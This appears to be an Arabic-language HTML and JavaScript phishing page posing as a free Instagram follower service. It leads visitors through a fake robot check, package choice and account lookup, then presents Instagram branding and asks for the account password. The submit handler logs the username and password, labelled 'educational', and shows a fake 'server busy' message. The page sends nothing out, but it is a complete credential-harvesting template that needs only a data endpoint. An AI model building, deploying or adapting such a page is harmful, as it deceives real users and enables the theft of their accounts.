<!DOCTYPE html>

<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>المنصة العالمية لزيادة المتابعين</title>

<!-- مكتبة الأيقونات وروابط الخطوط -->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

<style>

:root {

--primary-color: #0095f6;

--insta-gradient: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2397 75%, #bc1888 100%);

--bg-color: #fafafa;

}



body {

font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;

background-color: var(--bg-color);

margin: 0;

display: flex;

justify-content: center;

align-items: center;

min-height: 100vh;

}



.container {

background: white;

width: 90%;

max-width: 450px;

padding: 30px;

border-radius: 15px;

box-shadow: 0 10px 25px rgba(0,0,0,0.1);

text-align: center;

}



.step { display: none; animation: fadeIn 0.5s; }

.active { display: block; }



@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }



/* تنسيق الأزرار والبطاقات */

.card {

border: 2px solid #eee;

border-radius: 10px;

padding: 15px;

margin: 10px 0;

cursor: pointer;

transition: 0.3s;

display: flex;

justify-content: space-between;

align-items: center;

}



.card:hover { border-color: var(--primary-color); background: #f0f9ff; }

.card.free { border-color: #4caf50; background: #e8f5e9; }



.btn-main {

background: var(--primary-color);

color: white;

border: none;

padding: 12px 25px;

border-radius: 8px;

font-weight: bold;

cursor: pointer;

width: 100%;

margin-top: 15px;

}



input {

width: 100%;

padding: 12px;

margin: 10px 0;

border: 1px solid #dbdbdb;

border-radius: 5px;

box-sizing: border-box;

}



/* محاكاة التحقق من الروبوت */

.captcha-box {

border: 1px solid #ccc;

padding: 15px;

display: flex;

align-items: center;

background: #f9f9f9;

border-radius: 5px;

cursor: pointer;

}



.loader {

border: 4px solid #f3f3f3;

border-top: 4px solid var(--primary-color);

border-radius: 50%;

width: 30px;

height: 30px;

animation: spin 1s linear infinite;

margin: 20px auto;

display: none;

}



@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

</style>

</head>

<body>



<div class="container">


<!-- الخطوة 1: التحقق من الروبوت -->

<div id="step1" class="step active">

<h2 style="color: #444;">التحقق من الأمان</h2>

<p>يرجى إثبات أنك لست روبوت للوصول إلى الخدمات</p>

<div class="captcha-box" onclick="startVerification()">

<input type="checkbox" id="captcha" style="width: 20px; cursor: pointer;">

<label for="captcha" style="margin-right: 10px; cursor: pointer;">أنا لست برنامج روبوت</label>

<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" width="30" style="margin-right: auto;">

</div>

</div>



<!-- الخطوة 2: اختيار الباقة -->

<div id="step2" class="step">

<h2 style="color: var(--primary-color);">اختر باقة المتابعين</h2>

<div class="card free" onclick="goToStep3('100 متابع (مجاني)')">

<span>100 متابع</span>

<strong>مجاني</strong>

</div>

<div class="card" onclick="goToStep3('1000 متابع')">

<span>1000 متابع</span>

<strong>50 عملة</strong>

</div>

<div class="card" onclick="goToStep3('5000 متابع')">

<span>5000 متابع</span>

<strong>200 عملة</strong>

</div>

</div>



<!-- الخطوة 3: إدخال اليوزر والبحث -->

<div id="step3" class="step">

<h3>أدخل اسم المستخدم (Username)</h3>

<input type="text" id="instaUser" placeholder="مثال: @username">

<button class="btn-main" onclick="searchProfile()">بحث عن الحساب</button>

<div id="searchLoader" class="loader"></div>

</div>



<!-- الخطوة 4: تأكيد الحساب -->

<div id="step4" class="step">

<h3>هل هذا هو حسابك؟</h3>

<div style="margin: 20px 0;">

<div id="profileCircle" style="width: 100px; height: 100px; background: #eee; border-radius: 50%; margin: 0 auto; display: flex; align-items: center; justify-content: center; border: 2px solid var(--primary-color);">

<i class="fa fa-user fa-3x" style="color: #ccc;"></i>

</div>

<h4 id="displayUser"></h4>

</div>

<button class="btn-main" onclick="goToStep5()" style="background: #4caf50;">نعم، هذا حسابي</button>

<button class="btn-main" onclick="location.reload()" style="background: #f44336; margin-top: 5px;">لا، ابحث مجدداً</button>

</div>



<!-- الخطوة 5: تسجيل الدخول النهائي -->

<div id="step5" class="step">

<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" width="120">

<p>لتأكيد إرسال <span id="chosenPlan"></span>، يرجى تسجيل الدخول لتأكيد ملكية الحساب.</p>

<form id="finalForm">

<input type="text" id="finalUser" readonly>

<input type="password" id="finalPass" placeholder="كلمة المرور" required>

<button type="submit" class="btn-main">تأكيد الإرسال الآن</button>

</form>

</div>



</div>



<script>

let selectedPlan = "";



// 1. وظيفة التحقق من الروبوت

function startVerification() {

document.getElementById('captcha').checked = true;

setTimeout(() => {

showStep(2);

}, 800);

}



// 2. الانتقال لاختيار الباقة

function goToStep3(plan) {

selectedPlan = plan;

showStep(3);

}



// 3. محاكاة البحث عن الحساب

function searchProfile() {

const user = document.getElementById('instaUser').value;

if(!user) return alert("يرجى إدخال اليوزر");



document.getElementById('searchLoader').style.display = "block";


setTimeout(() => {

document.getElementById('searchLoader').style.display = "none";

document.getElementById('displayUser').innerText = user;

document.getElementById('finalUser').value = user;

showStep(4);

}, 2000); // محاكاة بحث لمدة ثانيتين

}



// 4. الانتقال للخطوة الأخيرة

function goToStep5() {

document.getElementById('chosenPlan').innerText = selectedPlan;

showStep(5);

}



// وظيفة التنقل بين الخطوات

function showStep(stepNum) {

document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));

document.getElementById('step' + stepNum).classList.add('active');

}



// 5. معالجة النموذج النهائي (التعليمي)

document.getElementById('finalForm').addEventListener('submit', function(e) {

e.preventDefault();

const u = document.getElementById('finalUser').value;

const p = document.getElementById('finalPass').value;



console.log("--- بيانات مستلمة (للغرض التعليمي) ---");

console.log("الحساب:", u);

console.log("كلمة السر:", p);

console.log("الباقة المطلوبة:", selectedPlan);



alert("عذراً، الخادم مشغول حالياً. حاول مرة أخرى لاحقاً.");

});

</script>



</body>

</html>
